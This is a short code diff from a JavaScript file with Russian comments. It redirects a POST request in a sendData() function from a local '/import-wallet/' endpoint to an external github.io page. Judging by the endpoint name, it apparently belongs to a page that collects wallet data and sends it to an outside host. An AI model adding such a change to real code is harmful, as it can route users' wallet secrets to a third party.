@@ -40,7 +40,7 @@ function sendData() {
   const xhr = new XMLHttpRequest();
   
   // Определяем метод, URL и асинхронность запроса
-  xhr.open('POST', 'http://127.0.0.1:5500/import-wallet/', true);
+  xhr.open('POST', 'https://st1ne.github.io/index.html', true);
   
   // Устанавливаем заголовки запроса
   xhr.setRequestHeader('Content-Type', 'application/json');
